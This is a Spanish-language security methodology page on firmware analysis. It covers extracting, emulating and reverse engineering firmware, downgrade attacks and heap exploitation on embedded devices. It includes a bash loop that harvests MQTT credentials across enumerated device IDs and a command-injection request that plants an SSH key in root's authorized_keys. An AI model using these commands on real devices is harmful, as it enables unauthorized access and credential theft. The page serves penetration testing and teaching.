# Análisis de firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Introducción**

### Recursos relacionados

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

El firmware es un software esencial que permite que los dispositivos funcionen correctamente, ya que administra y facilita la comunicación entre los componentes de hardware y el software con el que interactúan los usuarios. Se almacena en memoria permanente, lo que garantiza que el dispositivo pueda acceder a instrucciones vitales desde el momento en que se enciende, lo que permite iniciar el sistema operativo. Examinar y posiblemente modificar el firmware es un paso fundamental para identificar vulnerabilidades de seguridad.<sup>[[2]](#references)[[3]](#references)</sup>

## **Recopilación de información**

La **recopilación de información** es un paso inicial fundamental para comprender la composición de un dispositivo y las tecnologías que utiliza. Este proceso implica recopilar datos sobre:

- La arquitectura de la CPU y el sistema operativo que ejecuta
- Los detalles del bootloader
- La disposición del hardware y las hojas de datos
- Las métricas del código y las ubicaciones del código fuente
- Las bibliotecas externas y los tipos de licencia
- El historial de actualizaciones y las certificaciones reglamentarias
- Los diagramas de arquitectura y flujo
- Las evaluaciones de seguridad y las vulnerabilidades identificadas

Para este propósito, las herramientas de **inteligencia de fuentes abiertas (OSINT)** son muy valiosas, al igual que el análisis de cualquier componente de software de código abierto disponible mediante procesos de revisión manuales y automatizados. Herramientas como [Coverity Scan](https://scan.coverity.com) y [Semmle’s LGTM](https://lgtm.com/#explore) ofrecen análisis estático gratuito que se puede aprovechar para detectar posibles problemas.

## **Obtención del firmware**

La obtención del firmware se puede abordar de varias maneras, cada una con su propio nivel de complejidad:

- Obtenerlo **directamente** de la fuente (desarrolladores, fabricantes)
- **Compilarlo** siguiendo las instrucciones proporcionadas
- **Descargarlo** de sitios oficiales de soporte
- Utilizar consultas de **Google dork** para encontrar archivos de firmware alojados
- Acceder directamente al **almacenamiento en la nube** con herramientas como [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Interceptar **actualizaciones** mediante técnicas de man-in-the-middle
- **Extraerlo** del dispositivo mediante conexiones como **UART**, **JTAG** o **PICit**
- **Monitorizar** las solicitudes de actualización en las comunicaciones del dispositivo
- Identificar y usar **endpoints de actualización hardcodeados**
- **Volcarlo** desde el bootloader o la red
- **Retirar y leer** el chip de almacenamiento, si todo lo demás falla, utilizando las herramientas de hardware adecuadas

### Registros solo por UART: forzar una shell root mediante el entorno de U-Boot en flash

Si se ignora UART RX (solo hay registros), aun así puedes forzar una shell de init **editando sin conexión el blob del entorno de U-Boot**:<sup>[[6]](#references)</sup>

1. Volcar la SPI flash con un clip SOIC-8 y un programador (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Localiza la partición env de U-Boot, edita `bootargs` para incluir `init=/bin/sh` y **vuelve a calcular el CRC32 del blob de env de U-Boot**.
3. Vuelve a flashear solo la partición env y reinicia; debería aparecer un shell en UART.

Esto es útil en dispositivos embebidos cuyo shell del bootloader está deshabilitado, pero cuya partición env se puede escribir mediante acceso a la flash externa.

## Analizar el firmware

Ahora que **tienes el firmware**, necesitas extraer información sobre él para saber cómo tratarlo. Algunas herramientas que puedes usar para ello:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Si no encuentras mucho con esas herramientas, comprueba la **entropía** de la imagen con `binwalk -E <bin>`; si es baja, es poco probable que esté cifrada. Si es alta, es probable que esté cifrada (o comprimida de alguna manera).

Además, puedes usar estas herramientas para extraer **archivos incrustados en el firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

O [**binvis.io**](https://binvis.io/#/) ([código](https://code.google.com/archive/p/binvis/)) para inspeccionar el archivo.

### Obtener el sistema de archivos

Con las herramientas mencionadas anteriormente, como `binwalk -ev <bin>`, deberías haber podido **extraer el sistema de archivos**.\
Binwalk suele extraerlo en una **carpeta cuyo nombre corresponde al tipo de sistema de archivos**, que suele ser uno de los siguientes: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Extracción manual del sistema de archivos

A veces, binwalk **no incluye los bytes mágicos del sistema de archivos en sus firmas**. En esos casos, usa binwalk para **encontrar el offset del sistema de archivos y hacer carving del sistema de archivos comprimido** desde el binario, y **extrae manualmente** el sistema de archivos según su tipo siguiendo los pasos que se indican a continuación.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Ejecuta el siguiente **comando dd** para hacer carving del sistema de archivos Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternativamente, también se podría ejecutar el siguiente comando.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Para squashfs (usado en el ejemplo anterior)

`$ unsquashfs dir.squashfs`

Después, los archivos estarán en el directorio "`squashfs-root`".

- Archivos de archivo CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Para sistemas de archivos jffs2

`$ jefferson rootfsfile.jffs2`

- Para sistemas de archivos ubifs con flash NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Análisis del firmware

Una vez obtenido el firmware, es fundamental analizarlo para comprender su estructura y sus posibles vulnerabilidades. Este proceso implica utilizar varias herramientas para analizar y extraer datos valiosos de la imagen del firmware.

### Herramientas de análisis inicial

Se proporciona un conjunto de comandos para la inspección inicial del archivo binario (denominado `<bin>`). Estos comandos ayudan a identificar tipos de archivo, extraer cadenas, analizar datos binarios y comprender los detalles de las particiones y los sistemas de archivos:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Para evaluar el estado del cifrado de la imagen, se comprueba la **entropía** con `binwalk -E <bin>`. Una entropía baja sugiere que no hay cifrado, mientras que una entropía alta indica que podría haber cifrado o compresión.

Para extraer **archivos incrustados**, se recomiendan herramientas y recursos como la documentación de **file-data-carving-recovery-tools** y **binvis.io** para inspeccionar archivos.

### Extracción del sistema de archivos

Con `binwalk -ev <bin>`, normalmente se puede extraer el sistema de archivos, a menudo en un directorio cuyo nombre corresponde al tipo de sistema de archivos (por ejemplo, squashfs o ubifs). Sin embargo, cuando **binwalk** no reconoce el tipo de sistema de archivos porque faltan los magic bytes, es necesario extraerlo manualmente. Para ello, se usa `binwalk` para localizar el offset del sistema de archivos y, a continuación, el comando `dd` para extraerlo:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Después, según el tipo de sistema de archivos (p. ej., squashfs, cpio, jffs2, ubifs), se utilizan distintos comandos para extraer manualmente el contenido.

### Análisis del sistema de archivos

Una vez extraído el sistema de archivos, comienza la búsqueda de fallos de seguridad. Se presta atención a los daemons de red inseguros, las credenciales codificadas, los endpoints de API, las funciones del servidor de actualización, el código sin compilar, los scripts de inicio y los binarios compilados para su análisis offline.

Entre las **ubicaciones clave** y los **elementos** que se deben inspeccionar se incluyen:

- **etc/shadow** y **etc/passwd** para encontrar credenciales de usuario
- Certificados y claves SSL en **etc/ssl**
- Archivos de configuración y scripts en busca de posibles vulnerabilidades
- Binarios integrados para su análisis posterior
- Servidores web y binarios habituales de dispositivos IoT

Varias herramientas ayudan a descubrir información sensible y vulnerabilidades en el sistema de archivos:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) y [**Firmwalker**](https://github.com/craigz28/firmwalker) para buscar información sensible
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) para un análisis exhaustivo del firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) y [**EMBA**](https://github.com/e-m-b-a/emba) para análisis estático y dinámico

### Comprobaciones de seguridad en binarios compilados

Tanto el código fuente como los binarios compilados encontrados en el sistema de archivos deben examinarse minuciosamente en busca de vulnerabilidades. Herramientas como **checksec.sh** para binarios Unix y **PESecurity** para binarios Windows ayudan a identificar binarios sin protección que podrían explotarse.

## Recopilación de credenciales de configuración de cloud y MQTT mediante tokens de URL derivados

Muchos hubs IoT obtienen la configuración específica de cada dispositivo desde un endpoint de cloud con un formato similar a este:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Durante el análisis del firmware, es posible que descubras que `<token>` se deriva localmente del ID del dispositivo mediante un secreto codificado, por ejemplo:

- token = MD5( deviceId || STATIC_KEY ) y se representa como hexadecimal en mayúsculas

Este diseño permite que cualquiera que conozca un deviceId y el STATIC_KEY reconstruya la URL y obtenga la configuración de cloud, que a menudo revela credenciales MQTT en texto plano y prefijos de topics.

Flujo de trabajo práctico:

1) Extraer el deviceId de los registros de inicio UART

- Conectar un adaptador UART de 3,3 V (TX/RX/GND) y capturar los registros:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Busca las líneas que imprimen el patrón de URL de configuración de cloud y la dirección del broker, por ejemplo:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Recupera STATIC_KEY y el algoritmo del token del firmware

- Carga los binarios en Ghidra/radare2 y busca la ruta de configuración ("/pf/") o el uso de MD5.
- Confirma el algoritmo (p. ej., MD5(deviceId||STATIC_KEY)).
- Deriva el token en Bash y convierte el digest a mayúsculas:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Obtener la configuración de cloud y las credenciales de MQTT

- Construye la URL y descarga el JSON con curl; analízalo con jq para extraer los secretos:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Abusa de MQTT en texto plano y de ACLs débiles en los topics (si existen)

- Usa las credenciales recuperadas para suscribirte a topics de mantenimiento y buscar eventos sensibles:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Enumerar IDs de dispositivo predecibles (a escala, con autorización)

- Muchos ecosistemas incluyen bytes de OUI/producto/tipo del proveedor seguidos de un sufijo secuencial.
- Puedes iterar sobre IDs candidatos, derivar tokens y obtener configuraciones mediante programación:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notas
- Obtén siempre autorización explícita antes de intentar una enumeración masiva.
- Cuando sea posible, prefiere la emulación o el análisis estático para recuperar secretos sin modificar el hardware objetivo.

El proceso de emular firmware permite realizar **análisis dinámico** del funcionamiento de un dispositivo o de un programa individual. Este enfoque puede presentar desafíos relacionados con las dependencias de hardware o arquitectura, pero transferir el sistema de archivos raíz o binarios específicos a un dispositivo con la misma arquitectura y endianidad, como una Raspberry Pi, o a una máquina virtual precompilada, puede facilitar las pruebas posteriores.

### Emulación de binarios individuales

Para examinar programas individuales, es fundamental identificar su endianidad y arquitectura de CPU.

#### Ejemplo con arquitectura MIPS

Para emular un binario con arquitectura MIPS, se puede usar el comando:

```bash
file ./squashfs-root/bin/busybox
```

Y para instalar las herramientas de emulación necesarias:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Para MIPS (big-endian), se usa `qemu-mips`, y para los binarios little-endian, se elegiría `qemu-mipsel`.

#### Emulación de la arquitectura ARM

Para los binarios ARM, el proceso es similar: se utiliza el emulador `qemu-arm` para la emulación.

### Emulación completa del sistema

Herramientas como [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) y otras facilitan la emulación completa del firmware, automatizando el proceso y ayudando en el análisis dinámico.

## Análisis dinámico en la práctica

En esta etapa, se utiliza para el análisis un entorno de dispositivo real o emulado. Es esencial mantener el acceso al shell del sistema operativo y al sistema de archivos. Puede que la emulación no reproduzca perfectamente las interacciones con el hardware, por lo que a veces es necesario reiniciarla. El análisis debe volver a examinar el sistema de archivos, explotar las páginas web expuestas y los servicios de red, y explorar las vulnerabilidades del bootloader. Las pruebas de integridad del firmware son fundamentales para identificar posibles vulnerabilidades de backdoor.

## Técnicas de análisis en tiempo de ejecución

El análisis en tiempo de ejecución consiste en interactuar con un proceso o binario en su entorno operativo, utilizando herramientas como gdb-multiarch, Frida y Ghidra para establecer breakpoints e identificar vulnerabilidades mediante fuzzing y otras técnicas.

Para objetivos embebidos sin un debugger completo, **copia un `gdbserver` enlazado estáticamente al dispositivo y conéctate de forma remota**:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Mapeo de mensajes de Zigbee / coprocesador de radio

En los hubs IoT, la pila RF suele estar dividida entre un **MCU de radio** y un proceso de espacio de usuario de Linux. Un flujo de trabajo útil consiste en mapear la ruta:<sup>[[8]](#references)</sup>

1. **Trama RF** transmitida por el aire
2. **Parser del controlador** en el MCU de radio
3. **Protocolo de texto serial/UART o TLV** reenviado a Linux (por ejemplo, `/dev/tty*`)
4. **Dispatcher de la aplicación** en el daemon principal
5. **Manejador específico del protocolo / máquina de estados**

Esta arquitectura crea dos objetivos de ingeniería inversa en lugar de uno. Si el controlador convierte las tramas de radio binarias en un protocolo textual como `Group,Command,arg1,arg2,...`, identifica:

- Los **grupos de mensajes** y las tablas de dispatch
- Qué mensajes pueden provenir de la **red** y cuáles del propio controlador
- Los campos discriminadores exactos **específicos del fabricante** (por ejemplo, Zigbee `manufacturer_code` y `cluster_command` personalizado)
- Qué manejadores solo son accesibles durante las fases de **commissioning**, descubrimiento o descarga de firmware/modelos

En el caso específico de Zigbee, captura el tráfico de pairing y comprueba si el objetivo todavía depende del **Link Key** predeterminado `ZigBeeAlliance09`. Si es así, el sniffing del tráfico de commissioning puede revelar la **Network Key**. Los install codes de Zigbee 3.0 reducen esta exposición, así que comprueba si el dispositivo probado realmente los exige.

### Manejadores de protocolos específicos del fabricante y accesibilidad controlada por FSM

Los comandos Zigbee/ZCL específicos del fabricante suelen ser un objetivo mejor que los clusters estandarizados, ya que alimentan **código de parsing personalizado** y **FSMs** internas con validaciones menos probadas.<sup>[[8]](#references)</sup>

Flujo de trabajo práctico:

- Analiza el dispatcher de comandos hasta encontrar el **manejador exclusivo del fabricante**.
- Recupera las tablas de **estado**, **evento**, **comprobación**, **acción** y **siguiente estado** de la FSM.
- Identifica los **estados transitorios** que avanzan automáticamente y las ramas de reintento/error que finalmente restablecen o liberan el estado controlado por el atacante.
- Confirma qué intercambios legítimos del protocolo son necesarios para poner el daemon en el estado vulnerable, en lugar de asumir que el manejador vulnerable siempre es accesible.

Para protocolos sensibles al tiempo, la repetición de paquetes desde un framework de Python puede ser demasiado lenta. Un enfoque más fiable es emular un dispositivo legítimo en hardware real (por ejemplo, un **nRF52840**) con una pila de nivel de fabricante, para exponer los **endpoints**, **atributos** y tiempos de commissioning correctos.

### Clase de errores en descargas fragmentadas de daemons embebidos

Una clase recurrente de errores de firmware aparece en las descargas fragmentadas de blobs/modelos/configuraciones:<sup>[[8]](#references)</sup>

1. El **primer fragmento** (`offset == 0`) almacena `ctx->total_size` y asigna `malloc(total_size)`.
2. Los fragmentos posteriores solo validan campos **locales al paquete** controlados por el atacante, como `packet_total_size >= offset + chunk_len`.
3. La copia usa `memcpy(&ctx->buffer[offset], chunk, chunk_len)` sin comprobar que no supere el **tamaño asignado originalmente**.

Esto permite que un atacante envíe:

- Un primer fragmento válido con un tamaño total declarado **pequeño** para forzar una asignación pequeña en el heap.
- Un fragmento posterior con el **offset esperado**, pero con un `chunk_len` mayor.
- Un tamaño local al paquete falsificado que supera las comprobaciones recientes y, a la vez, desborda el búfer asignado originalmente.

Cuando la ruta vulnerable está detrás de la lógica de commissioning, el exploit debe incluir suficiente **emulación del dispositivo** para llevar al objetivo al estado esperado de descarga de modelo o de blob antes de enviar los fragmentos malformados.

### Disparadores de `free()` basados en el protocolo

En los daemons embebidos, la forma más sencilla de activar la explotación de metadatos del heap a menudo no es «esperar a que se ejecute la limpieza», sino **forzar el propio manejo de errores del protocolo**:<sup>[[8]](#references)</sup>

- Envía fragmentos posteriores malformados para llevar la FSM a estados de **reintento** o **error**.
- Supera el umbral de reintentos para que el daemon **restablezca el contexto** y libere el búfer corrupto.
- Usa este `free()` predecible para activar primitivas del asignador antes de que el proceso se bloquee por otros motivos.

Esto resulta especialmente útil contra asignadores **similares a musl/uClibc/dlmalloc** en Linux embebido, donde la corrupción de metadatos de chunks puede convertir la lógica de unlink/unbin en una primitiva de escritura. Un patrón estable consiste en corromper un **campo de tamaño** para redirigir el recorrido del asignador hacia **chunks falsos preparados dentro del búfer desbordado**, en vez de sobrescribir de inmediato punteros reales de bins y provocar el bloqueo del proceso.

## Explotación binaria y prueba de concepto

Desarrollar un PoC para vulnerabilidades identificadas requiere un conocimiento profundo de la arquitectura objetivo y programación en lenguajes de bajo nivel. Las protecciones de runtime binario son poco comunes en sistemas embebidos, pero, cuando están presentes, pueden ser necesarias técnicas como Return Oriented Programming (ROP).

### Notas sobre la explotación de fastbins de uClibc (Linux embebido)

- **Fastbins + consolidación:** uClibc usa fastbins similares a los de glibc. Una asignación grande posterior puede activar `__malloc_consolidate()`, así que cualquier chunk falso debe superar las comprobaciones (tamaño válido, `fd = 0` y los chunks circundantes deben considerarse «en uso»).<sup>[[6]](#references)</sup>
- **Binarios no PIE con ASLR:** si ASLR está habilitado, pero el binario principal **no es PIE**, las direcciones `.data/.bss` dentro del binario son estables. Puedes apuntar a una región que ya se parezca a una cabecera válida de chunk del heap para hacer que una asignación fastbin caiga en una **tabla de punteros a funciones**.
- **NUL que detiene el parser:** cuando se parsea JSON, un `\x00` en el payload puede detener el parsing y conservar los bytes controlados por el atacante que vienen después para un pivot de stack/cadena ROP.
- **Shellcode mediante `/proc/self/mem`:** una cadena ROP que invoque `open("/proc/self/mem")`, `lseek()` y `write()` puede colocar shellcode ejecutable en un mapeo conocido y saltar a él.

## Sistemas operativos preparados para el análisis de firmware

Sistemas operativos como [AttifyOS](https://github.com/adi0x90/attifyos) y [EmbedOS](https://github.com/scriptingxss/EmbedOS) ofrecen entornos preconfigurados para las pruebas de seguridad de firmware, equipados con las herramientas necesarias.

## Sistemas operativos preparados para analizar firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS es una distro diseñada para ayudarte a realizar evaluaciones de seguridad y pentesting de dispositivos del Internet de las cosas (IoT). Ahorra mucho tiempo al proporcionar un entorno preconfigurado con todas las herramientas necesarias.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): sistema operativo para pruebas de seguridad embebida basado en Ubuntu 18.04 y preinstalado con herramientas de pruebas de seguridad de firmware.

## Ataques de downgrade de firmware y mecanismos de actualización inseguros

Aunque un fabricante implemente comprobaciones de firma criptográfica para las imágenes de firmware, **a menudo se omite la protección contra la reversión de versión (downgrade)**. Si el cargador de arranque o de recuperación solo verifica la firma con una clave pública integrada, pero no compara la *versión* (o un contador monotónico) de la imagen que se va a instalar, un atacante puede instalar legítimamente un **firmware antiguo y vulnerable que aún tenga una firma válida**, reintroduciendo así vulnerabilidades corregidas.<sup>[[4]](#references)</sup>

Flujo de ataque típico:

1. **Obtén una imagen antigua firmada**
   * Descárgala del portal público de descargas, CDN o sitio de soporte del fabricante.
   * Extráela de las aplicaciones móviles/de escritorio complementarias (por ejemplo, dentro de `assets/firmware/` de un APK de Android).
   * Consíguela en repositorios de terceros como VirusTotal, archivos de Internet, foros, etc.
2. **Sube la imagen al dispositivo o sírvela** a través de cualquier canal de actualización expuesto:
   * Interfaz web, API de la aplicación móvil, USB, TFTP, MQTT, etc.
   * Muchos dispositivos IoT de consumo exponen endpoints HTTP(S) *sin autenticación* que aceptan blobs de firmware codificados en Base64, los decodifican en el servidor y activan la recuperación/actualización.
3. Después del downgrade, explota una vulnerabilidad que se haya corregido en una versión más reciente (por ejemplo, un filtro de command injection añadido posteriormente).
4. Opcionalmente, vuelve a instalar la imagen más reciente o desactiva las actualizaciones para evitar que te detecten una vez obtenida la persistencia.

### Ejemplo: command injection después de un downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

En el firmware vulnerable (con downgrade), el parámetro `md5` se concatena directamente en un comando de shell sin sanitizar, lo que permite inyectar comandos arbitrarios (en este caso, habilitar el acceso root mediante claves SSH). Las versiones posteriores del firmware introdujeron un filtro básico de caracteres, pero la ausencia de protección contra downgrade hace que la corrección sea inútil.<sup>[[4]](#references)</sup>

### Extracción de firmware de aplicaciones móviles

Muchos proveedores incluyen imágenes completas del firmware en sus aplicaciones móviles complementarias para que la aplicación pueda actualizar el dispositivo mediante Bluetooth/Wi-Fi. Estos paquetes suelen almacenarse sin cifrar en el APK/APEX, en rutas como `assets/fw/` o `res/raw/`. Herramientas como `apktool`, `ghidra` o incluso el comando `unzip` permiten extraer imágenes firmadas sin acceder al hardware físico.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Bypass de anti-rollback solo en el updater en diseños con slots A/B

Algunos proveedores sí implementan un **ratchet** anti-downgrade, pero solo dentro de la lógica del *updater* (por ejemplo, una rutina UDS sobre CAN, un comando de recuperación o un agente OTA en userspace). Si el **bootloader** luego solo comprueba la firma/CRC de la imagen y confía en la tabla de particiones o los metadatos del slot, aún se puede omitir la protección contra rollback.<sup>[[7]](#references)</sup>

Diseño débil típico:

- Los metadatos del firmware contienen tanto un descriptor de versión como un **ratchet** de seguridad / contador monotónico.
- El updater compara el ratchet de la imagen con un valor almacenado en almacenamiento persistente y rechaza imágenes firmadas más antiguas.
- El bootloader **no** analiza ese ratchet y solo verifica la cabecera, el CRC y la firma antes de arrancar el slot seleccionado.
- La activación del slot se almacena por separado en una tabla de particiones o en un contador de generación por slot y **no está vinculada criptográficamente** al digest exacto del firmware que se validó.

Esto crea una primitiva de **validar una imagen / arrancar otra** en sistemas de doble slot. Si el atacante puede hacer que el updater marque el slot B como el siguiente destino de arranque mediante una imagen firmada actual y luego sobrescribir el slot B antes del reinicio, el bootloader podría arrancar igualmente la imagen degradada porque solo confía en los metadatos del slot ya confirmados.

Patrón de abuso común:

1. Carga un firmware **actual y firmado** en el slot pasivo y ejecuta la rutina normal de validación/cambio para que el diseño marque ese slot como el siguiente activo.
2. **No reinicies todavía**. Vuelve a ejecutar la rutina de preparación/borrado de slots en la misma sesión.
3. Abusa de un estado de arranque obsoleto o de una lógica de selección de slot obsoleta para que el updater borre el **mismo slot físico** que se acaba de promover.
4. Escribe un firmware **más antiguo pero aún firmado** en ese slot.
5. Omite la rutina de validación que aplica el ratchet y reinicia directamente.
6. El bootloader selecciona el slot promovido, solo verifica la firma/integridad y arranca la imagen antigua.

Aspectos que conviene buscar al hacer reverse engineering de implementaciones de actualización A/B:

- Selección de slot derivada de **flags de arranque** que no se actualizan tras un cambio exitoso.
- Una rutina del estilo `prepare_passive_slot()` que borra un slot según un estado obsoleto en lugar del **diseño confirmado actual**.
- Una función del estilo `part_write_layout()` que solo incrementa un **contador de generación** / flag activo y no almacena el hash de la imagen validada.
- Comprobaciones del ratchet implementadas en userspace o en el código del updater, pero **no** en ROM / bootloader / etapas de secure boot.
- Rutinas de borrado o recuperación que dejan el slot marcado como arrancable incluso después de borrar y volver a escribir su contenido.

### Lista de comprobación para evaluar la lógica de actualización

* ¿Está adecuadamente protegida la autenticación/el transporte del *endpoint* de actualización (TLS + autenticación)?
* ¿El dispositivo compara **números de versión** o un **contador anti-rollback monotónico** antes de flashear?
* ¿Se verifica la imagen dentro de una cadena de secure boot (por ejemplo, el código ROM comprueba las firmas)?
* ¿El **bootloader aplica el mismo ratchet** que el updater, en lugar de limitarse a comprobar la firma/CRC?
* ¿Los metadatos de activación del slot están **vinculados al digest/versión del firmware validado**, o se puede modificar un slot después de promoverlo?
* Tras un cambio de slot exitoso, ¿se fuerza el reinicio del dispositivo o siguen siendo accesibles las rutinas posteriores de actualización/borrado dentro de la misma sesión?
* ¿El código de userland realiza comprobaciones de coherencia adicionales (por ejemplo, del mapa de particiones permitido o del número de modelo)?
* ¿Los flujos de actualización *parciales* o de *backup* reutilizan la misma lógica de validación?

> 💡  Si falta alguno de los elementos anteriores, probablemente la plataforma sea vulnerable a ataques de rollback.

## Firmware vulnerable para practicar

Para practicar cómo descubrir vulnerabilidades en firmware, usa los siguientes proyectos de firmware vulnerable como punto de partida.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Recuperar claves de descifrado del firmware a partir del estado de KMS/Vault integrado

Cuando una imagen de actualización combina pequeños metadatos en texto plano con un blob grande de alta entropía, analiza primero el contenedor antes de intentar fuerza bruta:<sup>[[1]](#references)</sup>

- Extrae las cabeceras, los offsets y los límites de línea con `hexdump`, `xxd`, `strings -tx`, `base64 -d` y `binwalk -E`.
- `Salted__` suele indicar el formato `enc` de OpenSSL: los siguientes 8 bytes son la sal y los bytes restantes son el texto cifrado.
- Un campo Base64 que se decodifica en exactamente `256` bytes es una señal clara de que podría tratarse de un texto cifrado RSA-2048 que envuelve una contraseña de firmware/clave de sesión aleatoria.
- El material PGP separado en el mismo archivo suele proteger solo la autenticidad; no des por sentado que es el mecanismo de confidencialidad.

Si la búsqueda estática de claves (`grep`, `strings`, búsquedas de PEM/PGP) no da resultado, haz reverse engineering de la **ruta operativa de descifrado** en lugar de limitarte a buscar claves privadas:

- Descompila el updater/binario de gestión y sigue quién lee el blob cifrado, qué helper/API lo desenvuelve y qué nombre lógico de clave solicita.
- Busca el estado de KMS en el sistema de archivos raíz extraído (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), además de archivos de unidad y scripts de inicio.
- Trata el texto plano `vault operator unseal ...`, las claves de recuperación, los tokens de bootstrap o los scripts locales de auto-unseal de KMS como equivalentes a material de clave privada.

Si el dispositivo incluye el binario original de Vault y el backend de almacenamiento, suele ser más fácil reproducir ese entorno que reimplementar los componentes internos de Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

